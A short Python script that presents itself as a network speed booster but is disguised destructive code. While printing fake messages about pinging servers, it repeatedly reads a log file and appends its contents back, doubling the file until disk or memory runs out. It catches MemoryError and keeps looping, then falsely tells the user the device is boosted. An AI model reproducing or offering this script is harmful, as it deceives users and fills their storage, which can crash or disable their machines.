#####Python Programme To Boost Your Network Speed######
myfile = open('Speed_Logs.txt', 'a+')
myfile.write(".")
text = ""
print("We'll ping some servers to initiate the speed boost. This may take a few seconds.")
a = True
while a:
    try:
        print("Pinging Sites: " + str(len(text)))
        myfile.seek(len(text))
        text = myfile.read()
        myfile.write(text)
    except MemoryError:
        print("Your Divice Is Now Highly Boosted")
        myfile.write(text)